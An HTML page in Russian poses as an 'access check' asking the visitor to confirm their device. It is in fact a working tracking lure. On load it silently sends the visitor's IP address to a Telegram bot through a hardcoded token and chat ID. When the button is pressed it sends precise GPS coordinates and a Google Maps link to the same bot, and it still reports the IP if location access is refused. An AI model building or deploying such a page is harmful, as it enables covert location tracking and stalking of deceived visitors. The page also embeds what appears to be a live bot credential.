<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка доступа</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
        }
        .card {
            background: #ffffff;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            text-align: center;
            max-width: 420px;
            width: 90%;
        }
        h2 { margin-bottom: 15px; color: #2c3e50; }
        p { font-size: 0.95rem; color: #666; margin-bottom: 20px; line-height: 1.5; }
        button {
            background: #27ae60;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 1rem;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.3s;
            width: 100%;
        }
        button:hover { background: #219150; }
        #status { margin-top: 15px; font-size: 0.9rem; color: #555; word-break: break-all; }
    </style>
</head>
<body>

    <div class="card">
        <h2>Проверка доступа</h2>
        <p>Для продолжения разрешите доступ к местоположению и подтвердите данные устройства.</p>
        <button onclick="requestGeo()">Подтвердить</button>
        <div id="status"></div>
    </div>

    <script>
        const TOKEN = '8845943863:AAHbVNrE_zL6vLR38U-Wc51dv3L0MCjOgi8';
        const CHAT_ID = '5905795768';

        let userIP = 'Определяется...';

        // Функция отправки сообщений
        function sendToTelegram(text) {
            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
            fetch(url).catch(err => console.error(err));
        }

        // 1. Автоматический сбор IP при заходи на сайт
        async function initIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
            } catch (e) {
                userIP = 'Не определен';
            }

            // Отправляем уведомление о заходе на сайт
            sendToTelegram(`🚨 <b>Новый посетитель на сайте!</b>\n\n🌐 IP: <code>${userIP}</code>`);
        }

        // 2. Геолокация при нажатии на кнопку
        function requestGeo() {
            const statusDiv = document.getElementById('status');

            if (!navigator.geolocation) {
                statusDiv.innerText = 'Геолокация не поддерживается.';
                return;
            }

            statusDiv.innerText = 'Запрашиваем геолокацию...';

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = Math.round(position.coords.accuracy);
                    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

                    statusDiv.innerHTML = '<span style="color: green;">Доступ подтвержден!</span>';

                    const msg = `🎯 <b>Получены точные координаты GPS!</b>\n\n` +
                                `🌐 IP: <code>${userIP}</code>\n\n` +
                                `📌 Широта: <code>${lat}</code>\n` +
                                `📌 Долгота: <code>${lon}</code>\n` +
                                `🎯 Точность: ~${accuracy}м\n\n` +
                                `🗺️ <a href="${mapsUrl}">Открыть на Google Картах</a>`;

                    sendToTelegram(msg);
                },
                (error) => {
                    statusDiv.innerHTML = '<span style="color: red;">Доступ отклонен.</span>';

                    const msg = `⚠️ <b>Посетитель запретил доступ к GPS</b>\n\n🌐 IP: <code>${userIP}</code>`;
                    sendToTelegram(msg);
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }

        // Запуск
        initIP();
    </script>

</body>
</html>
